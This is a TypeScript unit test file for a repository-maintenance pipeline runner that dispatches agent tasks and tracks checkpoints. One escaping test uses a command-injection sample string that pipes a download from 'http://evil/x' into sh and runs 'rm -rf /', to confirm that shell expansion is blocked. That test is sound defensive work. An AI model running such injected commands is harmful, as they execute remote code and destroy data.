import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";

import {
  parseArgs,
  escapeQuotes,
  formatDuration,
  renderProgressBar,
  renderDashboard,
  buildPrompt,
  buildPlaceholders,
  renderTemplate,
  isRepoCompleted,
  generateMarkdownReport,
  runPipeline,
  type DryRunResult,
  type PipelineSummary,
} from "../../../bin/pipeline-runner.mjs";

test("Pipeline Runner - 命令行参数解析", async (t) => {
  await t.test("解析默认参数", () => {
    const opts = parseArgs([]);
    assert.equal(opts.profile, "skm");
    assert.equal(opts.dispatchCmd, "");
    assert.equal(opts.timeout, 15);
    assert.equal(opts.interval, 10);
    assert.equal(opts.dryRun, false);
    assert.equal(opts.only, null);
    assert.equal(opts.reportFile, "maintenance-report.md");
    assert.equal(opts.help, false);
  });

  await t.test("解析指定参数（空格分隔）", () => {
    const argv = [
      "--profile",
      "custom-profile",
      "--dispatch-cmd",
      "ad run dispatch --repo {{repo}}",
      "--timeout",
      "25",
      "--interval",
      "5",
      "--dry-run",
      "--only",
      "order-service,payment-service",
      "--report-file",
      "custom-report.md",
    ];
    const opts = parseArgs(argv);
    assert.equal(opts.profile, "custom-profile");
    assert.equal(opts.dispatchCmd, "ad run dispatch --repo {{repo}}");
    assert.equal(opts.timeout, 25);
    assert.equal(opts.interval, 5);
    assert.equal(opts.dryRun, true);
    assert.equal(opts.only, "order-service,payment-service");
    assert.equal(opts.reportFile, "custom-report.md");
  });

  await t.test("解析指定参数（等号分隔）", () => {
    const argv = [
      "--profile=remote-skm",
      "--dispatch-cmd=curl -X POST http://agent/dispatch",
      "--timeout=30",
      "--interval=15",
      "--only=cron-service",
      "--report-file=out.md",
      "-h",
    ];
    const opts = parseArgs(argv);
    assert.equal(opts.profile, "remote-skm");
    assert.equal(opts.dispatchCmd, "curl -X POST http://agent/dispatch");
    assert.equal(opts.timeout, 30);
    assert.equal(opts.interval, 15);
    assert.equal(opts.only, "cron-service");
    assert.equal(opts.reportFile, "out.md");
    assert.equal(opts.help, true);
  });
});

test("Pipeline Runner - 安全引号转义", async (t) => {
  await t.test("转义双引号与反斜杠", () => {
    const input = 'fix(order): support "retry" & \\ escape';
    const escaped = escapeQuotes(input);
    assert.equal(escaped, 'fix(order): support \\"retry\\" & \\\\ escape');
  });

  await t.test("转义 $ 与反引号阻断命令注入", () => {
    const input = "fix: pay $(curl http://evil/x | sh) and `rm -rf /` and ${HOME}";
    const escaped = escapeQuotes(input);
    // $ 与反引号前必须带上反斜杠转义，阻断 Shell 展开
    assert.ok(escaped.includes("\\$(curl"));
    assert.ok(escaped.includes("\\`rm"));
    assert.ok(escaped.includes("\\${HOME}"));
    // 确认没有任何未被转义的裸 $ 或反引号
    assert.equal((escaped.match(/(?<!\\)\$/g) || []).length, 0);
    assert.equal((escaped.match(/(?<!\\)`/g) || []).length, 0);
  });

  await t.test("处理空值与非字符串", () => {
    assert.equal(escapeQuotes(null), "");
    assert.equal(escapeQuotes(undefined), "");
    assert.equal(escapeQuotes(12345), "12345");
  });

  await t.test("无引号字符串保持原样", () => {
    assert.equal(escapeQuotes("order-service"), "order-service");
  });
});

test("Pipeline Runner - 模版占位符填充与转义", async (t) => {
  const mockRepoItem = {
    repo: "order-service",
    path: "/srv/workspace/order-service",
    branch: "release",
    status: "changed",
    hasChanges: true,
    from: "1111111111111111111111111111111111111111",
    to: "2222222222222222222222222222222222222222",
    commitCount: 2,
    commits: [
      {
        hash: "2222222222222222222222222222222222222222",
        shortHash: "2222222",
        message: 'fix: handle "null" error',
      },
      {
        hash: "3333333333333333333333333333333333333333",
        shortHash: "3333333",
        message: "feat: add payment retry",
      },
    ],
    changedFilesSummary: {
      summaryText: "3 files changed, 25 insertions(+), 5 deletions(-)",
      filesChanged: 3,
      insertions: 25,
      deletions: 5,
    },
  };

  await t.test("抽取全量十项占位符并校验格式", () => {
    const placeholders = buildPlaceholders(mockRepoItem);
    assert.equal(placeholders.repo, "order-service");
    assert.equal(placeholders.path, "/srv/workspace/order-service");
    assert.equal(placeholders.branch, "release");
    assert.equal(placeholders.from, "1111111111111111111111111111111111111111");
    assert.equal(placeholders.to, "2222222222222222222222222222222222222222");
    assert.equal(placeholders.commitCount, 2);
    assert.equal(placeholders.changedFilesCount, 3);
    assert.equal(placeholders.diffSummary, "3 files changed, 25 insertions(+), 5 deletions(-)");
    assert.ok(placeholders.commitsSummary.includes('2222222 fix: handle "null" error'));
    assert.ok(placeholders.commitsSummary.includes("3333333 feat: add payment retry"));
    assert.ok(placeholders.prompt.includes("order-service"));
    assert.ok(placeholders.prompt.includes("links.verify"));
    assert.ok(placeholders.prompt.includes("maintenance.complete"));
  });

  await t.test("冷启动建库时占位符缺省兜底", () => {
    const initialItem = {
      path: "/srv/workspace/new-service",
      branch: "master",
      status: "initial",
      hasChanges: true,
      from: null,
      to: "aaaaaaa",
      commitCount: 10,
      initialInventoryRequired: true,
    };
    const placeholders = buildPlaceholders(initialItem);
    assert.equal(placeholders.repo, "new-service");
    assert.equal(placeholders.from, "initial");
    assert.equal(placeholders.changedFilesCount, 0);
    assert.equal(placeholders.diffSummary, "0 files changed");
    assert.ok(placeholders.commitsSummary.includes("冷启动建库"));
  });

  await t.test("模版插值替换包含安全引号转义", () => {
    const placeholders = buildPlaceholders(mockRepoItem);
    const template =
      'ad run dispatch --repo="{{repo}}" --to="{{to}}" --commits="{{commitsSummary}}" --prompt="{{prompt}}"';
    const rendered = renderTemplate(template, placeholders, { escapeQuotes: true });

    // 占位符均已替换
    assert.ok(!rendered.includes("{{repo}}"));
    assert.ok(!rendered.includes("{{to}}"));
    assert.ok(!rendered.includes("{{commitsSummary}}"));
    assert.ok(!rendered.includes("{{prompt}}"));

    // 包含的双引号必须被转义为 \"
    assert.ok(rendered.includes('\\"null\\"'));
    // prompt 中涉及的路径引号也必须被安全转义
    assert.ok(rendered.includes('-- path=\\"/srv/workspace/order-service\\"'));
  });

  await t.test("未开启转义时执行原生字符串插值", () => {
    const placeholders = {
      repo: "demo-repo",
      message: 'hello "world"',
    };
    const template = 'echo "{{repo}}: {{message}}"';
    const raw = renderTemplate(template, placeholders, { escapeQuotes: false });
    assert.equal(raw, 'echo "demo-repo: hello "world""');
  });

  await t.test("保留未知占位符", () => {
    const template = "run {{repo}} --unknown={{foo}}";
    const rendered = renderTemplate(template, { repo: "app" });
    assert.equal(rendered, "run app --unknown={{foo}}");
  });
});

test("Pipeline Runner - 内置单仓维护提示词生成 (buildPrompt)", async (t) => {
  const promptData = {
    repo: "order-service",
    path: "/srv/workspace/order-service",
    branch: "release",
    from: "1111111111111111111111111111111111111111",
    to: "2222222222222222222222222222222222222222",
    commitCount: 2,
    changedFilesCount: 3,
    commitsSummary: '2222222 fix: handle "null" error\n3333333 feat: add payment retry',
    diffSummary: "3 files changed, 25 insertions(+), 5 deletions(-)",
  };

  const prompt = buildPrompt(promptData);

  await t.test("验证任务背景与基线包含仓库、路径、分支、检查点与变更统计", () => {
    assert.ok(prompt.includes("order-service"));
    assert.ok(prompt.includes("/srv/workspace/order-service"));
    assert.ok(prompt.includes("release"));
    assert.ok(prompt.includes("1111111111111111111111111111111111111111"));
    assert.ok(prompt.includes("2222222222222222222222222222222222222222"));
    assert.ok(prompt.includes('2222222 fix: handle "null" error'));
    assert.ok(prompt.includes("3 files changed, 25 insertions(+), 5 deletions(-)"));
    assert.ok(prompt.includes("新增提交共 2 个，涉及 3 个文件变动"));
  });

  await t.test("验证包含编排技能规范引用", () => {
    assert.ok(prompt.includes("skills/knowledge-maintenance-orchestrator/SKILL.md"));
    assert.ok(prompt.includes("skills/project-knowledge-maintainer"));
  });

  await t.test("验证包含六大分类落盘规范、命名公式与根目录导航", () => {
    assert.ok(prompt.includes("/srv/workspace/order-service/docs/knowledge/<category>/"));
    assert.ok(prompt.includes("<category>-<topic>.md"));
    assert.ok(prompt.includes("index.md"));
    assert.ok(prompt.includes("overview.md"));
    assert.ok(prompt.includes("flow 类别"));
    assert.ok(prompt.includes("interface 类别"));
    assert.ok(prompt.includes("rule 类别"));
    assert.ok(prompt.includes("module 类别"));
    assert.ok(prompt.includes("data 类别"));
    assert.ok(prompt.includes("runbook 类别"));
  });

  await t.test("验证包含 data 类别红线约束", () => {
    assert.ok(prompt.includes("/srv/workspace/system-knowledge"));
    assert.ok(prompt.includes("db-map.md"));
    assert.ok(prompt.includes("ddl/data-ddl-{schema}.md"));
    assert.ok(prompt.includes("data/data-databases.md"));
    assert.ok(prompt.includes("严禁在代码仓自身文档中复制粘贴表结构或建表脚本"));
  });

  await t.test("验证包含工作区拓扑与绝对路径清单", () => {
    assert.ok(prompt.includes("目标仓库：/srv/workspace/order-service"));
    assert.ok(prompt.includes("兄弟代码仓：/srv/workspace/<sibling-repo>"));
    assert.ok(prompt.includes("系统知识仓：/srv/workspace/system-knowledge"));
    assert.ok(prompt.includes("动作参数统一使用绝对路径"));
  });

  await t.test("验证包含更新门槛与失效四问判定", () => {
    assert.ok(prompt.includes("行为：文档记载的流程、分支、状态、顺序、失败传播是否变化？"));
    assert.ok(prompt.includes("契约：文档记载的接口出入参、事件、队列、配置键语义是否变化？"));
    assert.ok(prompt.includes("定位：文档给出的文件、类、方法是否改名或移动？"));
    assert.ok(prompt.includes("缺失：是否新增了该文档主题内读者需要的事实"));
    assert.ok(prompt.includes("no_change_needed"));
  });

  await t.test("验证包含特权环境与工具自省速查", () => {
    assert.ok(prompt.includes("--profile skm"));
    assert.ok(prompt.includes("ad info"));
    assert.ok(prompt.includes("ad list"));
    assert.ok(prompt.includes("ad describe"));
    assert.ok(prompt.includes("workspace/search.rg"));
    assert.ok(prompt.includes("workspace/files.read"));
    assert.ok(prompt.includes("workspace/files.edit"));
    assert.ok(prompt.includes("workspace/files.write"));
    assert.ok(prompt.includes("workspace/files.list"));
    assert.ok(prompt.includes("workspace/bash.exec"));
  });

  await t.test("验证包含断链自检与就地修复门禁铁律", () => {
    assert.ok(prompt.includes("workspace/links.verify"));
    assert.ok(prompt.includes("brokenCount > 0"));
    assert.ok(prompt.includes("brokenCount === 0"));
    assert.ok(prompt.includes("files.edit"));
    assert.ok(prompt.includes("git status"));
    assert.ok(prompt.includes("git diff"));
    assert.ok(prompt.includes("git restore ."));
  });

  await t.test("验证包含最终交付与检查点推进绝对标志", () => {
    assert.ok(prompt.includes("maintenance/maintenance.publish"));
    assert.ok(prompt.includes("maintenance/maintenance.complete"));
    assert.ok(prompt.includes("docs_updated"));
    assert.ok(prompt.includes("no_change_needed"));
  });

  await t.test("验证缺省入参时的稳健兜底", () => {
    const minimalPrompt = buildPrompt({});
    assert.ok(minimalPrompt.includes("目标仓库："));
    assert.ok(minimalPrompt.includes("工作区绝对路径：/srv/workspace"));
    assert.ok(minimalPrompt.includes("目标分支：master"));
    assert.ok(minimalPrompt.includes("前置检查点：initial"));
    assert.ok(minimalPrompt.includes("无新增提交"));
    assert.ok(minimalPrompt.includes("无文件变动"));
    assert.ok(minimalPrompt.includes("links.verify"));
    assert.ok(minimalPrompt.includes("maintenance.complete"));
  });

  await t.test("验证提示词遵循 AGENTS.md 规范（无数字序号列表、无表情符号、无粗体嵌套行内代码）", () => {
    // 严禁包含数字列表（1. 2. 3. 等）
    assert.ok(!/^\s*\d+\.\s/m.test(prompt));
    // 严禁包含表情符号
    assert.ok(!/[\u{1F300}-\u{1F9FF}]/u.test(prompt));
    // 严禁粗体嵌套行内代码（如 **`...`**）
    assert.ok(!/\*\*[^*]*`[^*]*\*\*/.test(prompt));
  });
});

test("Pipeline Runner - 单仓检查点推进判定", async (t) => {
  const targetCommit = "2222222222222222222222222222222222222222";

  await t.test("检查点完全对齐目标提交时判定完成", () => {
    const status = {
      from: "2222222222222222222222222222222222222222",
      to: "2222222222222222222222222222222222222222",
      hasChanges: false,
    };
    assert.equal(isRepoCompleted(status, targetCommit), true);
  });

  await t.test("检查点短哈希前缀匹配时判定完成", () => {
    const status = {
      from: "2222222",
      hasChanges: false,
    };
    assert.equal(isRepoCompleted(status, targetCommit), true);

    const longStatus = {
      from: targetCommit,
    };
    assert.equal(isRepoCompleted(longStatus, "2222222"), true);
  });

  await t.test("状态为 upToDate 时判定完成", () => {
    const status = {
      status: "upToDate",
      from: "1111111",
      to: "2222222222222222222222222222222222222222",
    };
    assert.equal(isRepoCompleted(status, targetCommit), true);
  });

  await t.test("hasChanges 为 false 且非 error 状态判定完成", () => {
    const status = {
      status: "ok",
      hasChanges: false,
    };
    assert.equal(isRepoCompleted(status, targetCommit), true);
  });

  await t.test("支持解包 ActionDock 信封格式数据", () => {
    const envelope = {
      ok: true,
      data: {
        from: targetCommit,
        hasChanges: false,
      },
    };
    assert.equal(isRepoCompleted(envelope, targetCommit), true);
  });

  await t.test("仍有未处理变更且检查点未更新时判定未完成", () => {
    const status = {
      status: "changed",
      from: "1111111111111111111111111111111111111111",
      to: targetCommit,
      hasChanges: true,
    };
    assert.equal(isRepoCompleted(status, targetCommit), false);
  });

  await t.test("错误状态判定未完成", () => {
    const status = {
      status: "error",
      hasChanges: false,
      message: "Git error",
    };
    assert.equal(isRepoCompleted(status, targetCommit), false);
  });
});

test("Pipeline Runner - 看板与报告格式化", async (t) => {
  await t.test("耗时格式化准确", () => {
    assert.equal(formatDuration(0), "00:00");
    assert.equal(formatDuration(5000), "00:05");
    assert.equal(formatDuration(65000), "01:05");
    assert.equal(formatDuration(3600000), "60:00");
  });

  await t.test("进度条计算准确", () => {
    assert.ok(renderProgressBar(0, 10).includes("0%"));
    assert.ok(renderProgressBar(5, 10).includes("50%"));
    assert.ok(renderProgressBar(10, 10).includes("100%"));
  });

  await t.test("终端实时看板信息完整且无表情符号", () => {
    const dashboard = renderDashboard({
      total: 10,
      processed: 4,
      skipped: 2,
      completed: 2,
      failed: 0,
      activeRepo: "order-service",
      activeRepoElapsed: 30000,
      totalElapsed: 90000,
    });
    assert.ok(dashboard.includes("总仓数: 10"));
    assert.ok(dashboard.includes("已跳过: 2"));
    assert.ok(dashboard.includes("已完成: 2"));
    assert.ok(dashboard.includes("失败: 0"));
    assert.ok(dashboard.includes("当前活跃仓: order-service"));
    // 严禁包含表情符号
    assert.ok(!/[\u{1F300}-\u{1F9FF}]/u.test(dashboard));
  });

  await t.test("生成 Markdown 报告符合 AGENTS.md 规范", () => {
    const report = generateMarkdownReport({
      profile: "skm",
      total: 3,
      completed: 1,
      skipped: 1,
      failed: 1,
      totalElapsedMs: 120000,
      results: [
        {
          repo: "up-to-date-repo",
          path: "/srv/workspace/up-to-date-repo",
          status: "skipped",
          durationMs: 0,
          message: "远端检查点已对齐",
        },
        {
          repo: "order-service",
          path: "/srv/workspace/order-service",
          status: "completed",
          targetCommit: "2222222",
          durationMs: 60000,
          message: "检查点已成功推进至 2222222",
        },
        {
          repo: "payment-service",
          path: "/srv/workspace/payment-service",
          status: "failed",
          targetCommit: "3333333",
          durationMs: 60000,
          message: "等待检查点推进超时 (1 分钟)",
        },
      ],
    });

    // 严禁包含数字列表（1. 2. 3.）
    assert.ok(!/^\d+\.\s/m.test(report));
    // 严禁包含表情符号
    assert.ok(!/[\u{1F300}-\u{1F9FF}]/u.test(report));
    // 排版采用无序列表符号
    assert.ok(report.includes("- 扫描总仓库数：3"));
    assert.ok(report.includes("- 维护成功数：1"));
    assert.ok(report.includes("- 跳过无需更新数：1"));
    assert.ok(report.includes("- 失败或超时数：1"));
    assert.ok(report.includes("- 仓库标识：order-service"));
  });
});

test("Pipeline Runner - 流程调度与观测闭环（模拟执行）", async (t) => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "pipeline-test-"));
  const reportPath = path.join(tmpDir, "report.md");

  const mockScanData = {
    batch: true,
    results: [
      {
        repo: "clean-service",
        path: "/srv/workspace/clean-service",
        branch: "release",
        status: "upToDate",
        hasChanges: false,
        from: "0000000",
        to: "0000000",
      },
      {
        repo: "changed-service",
        path: "/srv/workspace/changed-service",
        branch: "release",
        status: "changed",
        hasChanges: true,
        from: "1111111",
        to: "2222222",
        commitCount: 1,
        commits: [{ hash: "2222222", shortHash: "2222222", message: "feat: update" }],
      },
      {
        repo: "timeout-service",
        path: "/srv/workspace/timeout-service",
        branch: "release",
        status: "changed",
        hasChanges: true,
        from: "3333333",
        to: "4444444",
        commitCount: 1,
        commits: [{ hash: "4444444", shortHash: "4444444", message: "feat: timeout" }],
      },
    ],
  };

  await t.test("预演模式：只打印不触发派发与轮询", async () => {
    const dispatched: string[] = [];
    const execFn = async () => ({
      stdout: JSON.stringify({ ok: true, data: mockScanData }),
      stderr: "",
    });

    const result = (await runPipeline(
      {
        profile: "skm",
        dryRun: true,
        dispatchCmd: "ad run my-agent --repo {{repo}}",
      },
      {
        execFn,
        dispatchFn: async (cmd: string) => dispatched.push(cmd),
      }
    )) as DryRunResult;

    assert.equal(result.dryRun, true);
    assert.equal(result.total, 3);
    assert.equal(result.skipped, 1);
    assert.equal(result.pending, 2);
    assert.equal(dispatched.length, 0); // 绝对不触发实际派发
    assert.equal(result.dryRunOutput.length, 2);
    assert.equal(result.dryRunOutput[0].repo, "changed-service");
    assert.equal(result.dryRunOutput[0].renderedCommand, "ad run my-agent --repo changed-service");
  });

  await t.test("--only 过滤仓库", async () => {
    const execFn = async () => ({
      stdout: JSON.stringify({ ok: true, data: mockScanData }),
      stderr: "",
    });

    const result = (await runPipeline(
      {
        profile: "skm",
        dryRun: true,
        only: "changed-service",
      },
      { execFn }
    )) as DryRunResult;

    assert.equal(result.total, 1);
    assert.equal(result.pending, 1);
    assert.equal(result.dryRunOutput[0].repo, "changed-service");
  });

  await t.test("扫描状态为 error 的仓库计为失败而非跳过", async () => {
    const scanWithError = {
      batch: true,
      results: [
        {
          repo: "broken-service",
          path: "/srv/workspace/broken-service",
          status: "error",
          hasChanges: false,
          message: "Git error: fatal: not a git repository",
        },
        {
          repo: "clean-service",
          path: "/srv/workspace/clean-service",
          status: "upToDate",
          hasChanges: false,
        },
      ],
    };
    const execFn = async () => ({
      stdout: JSON.stringify({ ok: true, data: scanWithError }),
      stderr: "",
    });

    const result = (await runPipeline(
      { profile: "skm", dryRun: true },
      { execFn }
    )) as DryRunResult;

    assert.equal(result.skipped, 1);
    assert.equal(result.pending, 0);
    // error 条目不应出现在待派发清单中，也不应被伪装成 skipped
  });

  await t.test("非预演模式未传 --dispatch-cmd 时抛出异常", async () => {
    const execFn = async () => ({
      stdout: JSON.stringify({ ok: true, data: mockScanData }),
      stderr: "",
    });

    await assert.rejects(
      async () => {
        await runPipeline(
          {
            profile: "skm",
            dryRun: false,
            dispatchCmd: "",
          },
          { execFn }
        );
      },
      {
        message: /缺少必需参数：--dispatch-cmd/,
      }
    );
  });

  await t.test("成功闭环与超时分支覆盖", async () => {
    const dispatchedCmds: string[] = [];
    let pollCountChanged = 0;
    // 虚拟时钟：避免真实时序受并行测试负载影响导致超时误判
    let virtualNow = 0;
    const nowFn = () => virtualNow;
    const sleepFn = async (ms: number) => {
      virtualNow += ms;
    };

    const execFn = async (cmd: string) => {
      // 首次全量扫描
      if (cmd.includes("maintenance.list") && !cmd.includes("-- path=")) {
        return {
          stdout: JSON.stringify({ ok: true, data: mockScanData }),
          stderr: "",
        };
      }

      // 针对 changed-service 的轮询：第 2 次返回推进到 2222222
      if (cmd.includes("changed-service")) {
        pollCountChanged++;
        if (pollCountChanged >= 2) {
          return {
            stdout: JSON.stringify({
              ok: true,
              data: {
                repo: "changed-service",
                from: "2222222",
                to: "2222222",
                hasChanges: false,
                status: "upToDate",
              },
            }),
            stderr: "",
          };
        }
        return {
          stdout: JSON.stringify({
            ok: true,
            data: {
              repo: "changed-service",
              from: "1111111",
              to: "2222222",
              hasChanges: true,
              status: "changed",
            },
          }),
          stderr: "",
        };
      }

      // 针对 timeout-service 的轮询：始终不推进
      if (cmd.includes("timeout-service")) {
        return {
          stdout: JSON.stringify({
            ok: true,
            data: {
              repo: "timeout-service",
              from: "3333333",
              to: "4444444",
              hasChanges: true,
              status: "changed",
            },
          }),
          stderr: "",
        };
      }

      return { stdout: "{}", stderr: "" };
    };

    const progressUpdates: any[] = [];

    const result = (await runPipeline(
      {
        profile: "skm",
        dispatchCmd: "dispatch --repo {{repo}}",
        timeout: 0.001, // 约 60ms 超时，用于单元测试
        interval: 0.001,
        reportFile: reportPath,
        dryRun: false,
      },
      {
        execFn,
        dispatchFn: async (cmd: string) => {
          dispatchedCmds.push(cmd);
        },
        sleepFn,
        nowFn,
        onProgress: (p: any) => progressUpdates.push(p),
      }
    )) as PipelineSummary;

    assert.equal(result.total, 3);
    assert.equal(result.skipped, 1);
    assert.equal(result.completed, 1);
    assert.equal(result.failed, 1);
    assert.equal(dispatchedCmds.length, 2);
    assert.equal(dispatchedCmds[0], "dispatch --repo changed-service");
    assert.equal(dispatchedCmds[1], "dispatch --repo timeout-service");

    // 检查点闭环与超时记录
    const changedRes = result.results.find((r: any) => r.repo === "changed-service");
    assert.equal(changedRes?.status, "completed");
    assert.ok(changedRes?.message?.includes("成功推进"));

    const timeoutRes = result.results.find((r: any) => r.repo === "timeout-service");
    assert.equal(timeoutRes?.status, "failed");
    assert.ok(timeoutRes?.message?.includes("超时"));

    // 校验结算 Markdown 报告落地
    assert.ok(fs.existsSync(reportPath));
    const savedReport = fs.readFileSync(reportPath, "utf8");
    assert.ok(savedReport.includes("# 知识维护流水线执行报告"));
    assert.ok(savedReport.includes("changed-service"));
    assert.ok(savedReport.includes("成功闭环"));
    assert.ok(savedReport.includes("timeout-service"));
    assert.ok(savedReport.includes("执行失败"));

    // 清理临时文件
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });
});
